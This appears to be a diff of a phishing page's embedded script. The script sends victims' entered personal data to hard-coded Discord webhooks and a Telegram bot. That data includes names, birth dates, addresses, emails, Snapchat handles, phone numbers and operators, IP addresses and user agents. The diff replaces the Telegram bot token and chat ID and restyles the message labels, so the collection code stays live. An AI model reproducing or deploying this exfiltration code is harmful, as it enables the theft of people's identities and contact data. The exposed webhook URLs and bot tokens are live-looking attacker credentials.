@@ -85,8 +85,8 @@
   <script>
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
     const DISCORD_ALT_WEBHOOK_URL = "https://discord.com/api/webhooks/1402568400475131924/EPF82eqz6XawrnId5YB6nCCXs46u5PuccOkYDlKjm6WddiwWJDB6WnOtMWRCvxE-1Eec";
-    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6o-VP8_aPOnsT6Qk9tBN2E";
-    const TELEGRAM_CHAT_ID = "-1002810249796";
+    const TELEGRAM_TOKEN = "8376532446:AAEJHOCBBO8KrHJb2pnrsu2e1-Ow17pl9r0";
+    const TELEGRAM_CHAT_ID = "8431463416";
 
     async function sendDiscord(embed, webhookUrl) {
       return fetch(webhookUrl, {
@@ -170,20 +170,20 @@
 
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
-        `🚀 Nom : ${step2.nom}\n` +
-        `🚀 Prénom : ${step2.prenom}\n` +
-        `🎂 Naissance : ${step2.naissance}\n` +
+        `|🇪🇪| Nom : ${step2.nom}\n` +
+        `|🇪🇪| Prénom : ${step2.prenom}\n` +
+        `|🇪🇪| Naissance : ${step2.naissance}\n` +
         `🏠 Adresse : ${step2.adresse || "Non fournie"}\n` +
         `🏠 Ville : ${step2.ville}\n` +
         `🏠 Code Postal : ${step2.codePostal}\n` +
-        `📧 E‑Mail : ${step2.email}\n` +
-        `👻 Snapchat : ${step2.snap}\n\n` +
+        `|🪁| E‑Mail : ${step2.email}\n` +
+        `|🇪🇪| Snapchat : ${step2.snap}\n\n` +
         `[📞] Phone [📞]\n` +
-        `📶 Opérateur : ${operateur}\n` +
-        `📱 Téléphone : ${telephone}\n\n` +
+        `|🪁| Opérateur : ${operateur}\n` +
+        `|🪁| Téléphone : ${telephone}\n\n` +
         `[🌐] TIERS [🌐]\n` +
-        `📟 Adresse IP : ${ip}\n` +
-        `🔎 User-Agent : ${ua}`;
+        `|🥥| Adresse IP : ${ip}\n` +
+        `|🥥| User-Agent : ${ua}`;
 
       try {
         await Promise.all([
